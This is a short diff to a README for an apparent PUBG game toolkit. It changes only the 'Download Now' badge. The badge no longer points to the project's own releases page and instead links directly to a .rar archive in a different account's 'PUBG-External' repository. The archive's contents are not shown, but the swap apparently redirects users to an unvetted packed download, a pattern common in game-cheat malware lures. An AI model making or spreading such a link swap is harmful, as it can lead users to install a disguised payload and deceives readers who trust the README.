@@ -35,7 +35,7 @@
 
 Get the latest release from the **[Releases](https://github.com/yourname/pubg-toolkit/releases/latest)** tab.
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/yourname/pubg-toolkit/releases/latest)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/savagedragonrevive7/PUBG-External/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
 
 ---
 
